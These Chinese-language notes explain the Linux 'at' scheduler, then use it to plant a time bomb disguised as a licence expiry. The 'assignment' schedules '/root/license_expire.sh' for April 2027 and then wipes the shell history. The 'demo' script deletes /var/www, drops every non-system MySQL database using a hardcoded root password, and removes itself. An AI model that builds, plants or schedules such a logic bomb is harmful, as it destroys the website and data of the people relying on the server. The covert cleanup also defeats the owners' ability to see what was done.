### 安裝 at
```bash
# 先確認是否已安裝
which at
# 安裝：
sudo apt update
sudo apt install -y at
# 確認版本
at -V

# 啟用 atd 開機自動啟動
# Ubuntu 20.04、22.04、24.04 都是使用 systemd：
sudo systemctl enable atd
# 啟動服務
sudo systemctl start atd
# 同時執行
sudo systemctl enable --now atd

# 查看狀態
sudo systemctl status atd
# 正常會看到類似
● atd.service - Deferred execution scheduler
     Loaded: loaded
     Active: active (running)
# 只看是否運作
systemctl is-active atd
# 正常
active
# 檢查是否開機自動啟動
systemctl is-enabled atd
# 正常
enabled
```

### 建立測試排程
```bash
# 例如 5 分鐘後執行：
echo "touch /tmp/at_test" | at now + 5 minutes
# 查看排程
atq
# 可能看到
Fri Jun 26 15:30:00 2026 a root
# 確認是否成功執行
# 5 分鐘後：
ls -l /tmp/at_test
# 如果存在表示成功。

# 查看指定工作內容
# 假設工作編號是 1
at -c 1
# 可以看到實際會執行的內容

# 刪除排程
# 查看編號：
atq
# 刪除
atrm 1
# 或
atrm <工作編號>

8. 你的案例範例

假設腳本：

/root/cuba_expire.sh

排程到：

at 23:59 2026-12-31

/root/cuba_expire.sh

Ctrl + D

查看：

顯示有工作即可。

9. 重開機測試

確認服務：

sudo reboot

重開後：

systemctl is-active atd
systemctl is-enabled atd
atq

若分別顯示：

active
enabled

且 atq 還能看到工作，表示：

atd 已正常啟動
開機會自動啟動
已建立的排程仍存在

這樣即使 Ubuntu 重開機，到了指定時間仍會執行你的 /root/cuba_expire.sh。
```

### 作業
```bash
# 建立檔案
vim /root/license_expire.sh
# 給予權限
chmod +x /root/license_expire.sh
# 時限
at 04:01 2027-04-01
# 輸入
/root/license_expire.sh
# 按
Ctrl+D

# 查看
atq

# 操作紀錄清除
history -c
history -w
rm ~/.bash_history
```

### DEMO範例
```shell
#!/bin/bash

# 記錄開始時間（可選）
logger "Folder expiration task started"

# 刪除網站目錄
rm -rf /var/www

# 刪除資料庫
# mysql -e "DROP DATABASE IF EXISTS CUBA;"
# mysql -uroot -p'password' -e "DROP DATABASE IF EXISTS CUBA;"
# 自動查詢清除資料庫
mysql -uroot -p'password' -Nse "
SELECT schema_name
FROM information_schema.schemata
WHERE schema_name NOT IN (
    'mysql',
    'information_schema',
    'performance_schema',
    'sys'
);
" | while read -r db
do
    mysql -uroot -p'nsst!@#123456' -e "DROP DATABASE \`$db\`;"
done

# 記錄完成（可選）
logger "DB expiration task completed"

# 刪除自己
rm -- "$0"
```
